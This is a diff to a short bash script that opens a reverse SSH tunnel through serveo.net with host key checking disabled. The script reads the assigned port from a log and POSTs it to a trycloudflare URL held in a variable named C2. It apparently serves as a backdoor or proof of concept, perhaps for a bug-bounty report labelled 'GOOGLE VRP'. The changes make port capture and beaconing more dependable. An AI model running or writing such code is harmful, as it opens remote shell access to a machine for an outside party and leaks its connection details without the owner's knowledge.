@@ -1,25 +1,26 @@
 #!/bin/bash
-# C2: https://rainbow-nutrition-bottom-beginners.trycloudflare.com
+# URL: https://rainbow-nutrition-bottom-beginners.trycloudflare.com
+C2="https://rainbow-nutrition-bottom-beginners.trycloudflare.com"
 
-URL="https://rainbow-nutrition-bottom-beginners.trycloudflare.com"
+# --- THE SSH BRIDGE ---
+# We use -f to background it and 0:localhost:22 to ask for a random port
+ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -f -R 0:localhost:22 serveo.net sleep 3600 > /tmp/ssh_info 2>&1
 
-ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -f -R 0:localhost:22 serveo.net sleep 3600 2>&1 > /tmp/ssh_info
+# Wait 12 seconds for Serveo to assign the port
+sleep 12
 
-# Wait 10 seconds (gives Serveo more time to assign a port)
-sleep 10
-
-# Grab the SPECIFIC port from the log
-SSH_PORT=$(grep -oE "port [0-9]+" /tmp/ssh_info | awk '{print $2}')
+# This grabs the assigned port (e.g., 14523)
+SSH_PORT=$(grep -o "forwarding TCP traffic from .*" /tmp/ssh_info | sed 's/.*serveo.net://')
 
 {
   echo "--- GOOGLE VRP: SSH SESSION READY ---"
   echo "TIMESTAMP: $(date)"
   if [ -z "$SSH_PORT" ]; then
-    echo "ERROR: Serveo didn't assign a port yet. Log output:"
+    echo "STATUS: Port not assigned yet. Full Log below:"
     cat /tmp/ssh_info
   else
-    echo "COMMAND TO RUN ON YOUR MAC:"
+    echo "SUCCESS! RUN THIS ON YOUR MAC:"
     echo "ssh -v -p $SSH_PORT root@serveo.net"
   fi
   echo "--------------------------------------"
-} | curl -s -X POST --data-binary @- "$URL"
+} | curl -s -X POST --data-binary @- "$C2"
